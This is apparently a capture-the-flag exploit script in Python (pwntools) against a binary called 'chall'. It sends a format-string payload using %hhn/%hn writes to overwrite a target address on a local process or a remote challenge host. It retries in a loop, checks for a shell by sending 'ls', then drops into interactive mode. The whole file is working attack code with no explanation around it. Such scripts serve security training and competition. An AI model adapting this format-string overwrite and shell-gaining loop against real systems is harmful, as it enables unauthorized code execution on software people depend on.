#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
# nc 34.62.69.250 41065
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*vuln+100

        c
        ''')
        sleep(1)
# if args.REMOTE:
#     p = remote('34.62.69.250', 41065)
# else:
#     p = process([exe.path])
# # GDB()
# # target: 0x000015555522773b

# load = flat(
#    f'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%{0x28-0xe}c%hhn',
#    f'%{0x5258-0x28}c%hn',
    
# )

# sla(b'> ', load)


while True:
    if args.REMOTE:
        p = remote('34.62.69.250', 41065)
    else:
        p = process([exe.path])
    # GDB()
    # target: 0x000015555522773b

    load = flat(
    f'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%{0x28-0xe}c%hhn',
    f'%{0x5258-0x28}c%hn',
        
    )

    sla(b'> ', load)
    # sl(b'ls')
    try:
        a = p.recvall()
        if b'Goodbye!' in a:
            p.close()
            continue
        sl(b'ls')
        a = p.recv(10)
        if b' ' in a:
            break
        else:
            p.close()
            continue
    except EOFError:
        p.close()
        continue

p.interactive()
